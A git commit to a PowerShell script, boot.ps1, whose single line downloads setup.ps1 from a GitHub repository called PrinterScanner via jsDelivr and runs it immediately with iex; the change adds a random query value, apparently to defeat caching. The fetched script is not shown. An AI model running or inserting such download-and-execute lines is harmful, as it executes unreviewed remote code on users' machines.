13edf177d2fde725d51d44f3589d35252bfe0f6f
BeeCos1 <159466752+BeeCos1@users.noreply.github.com>
2026-04-21 12:27:55 +0500

    Update boot.ps1

--- boot.ps1
+++ boot.ps1
@@ -1,1 +1,1 @@
-$w=New-Object Net.WebClient; $w.Encoding=[System.Text.Encoding]::UTF8; iex $w.DownloadString('https://cdn.jsdelivr.net/gh/BeeCos1/PrinterScanner@main/setup.ps1')
+$v = Get-Random; $w = New-Object Net.WebClient; $w.Encoding = [System.Text.Encoding]::UTF8; iex $w.DownloadString("https://cdn.jsdelivr.net/gh/BeeCos1/PrinterScanner@main/setup.ps1?v=$v")
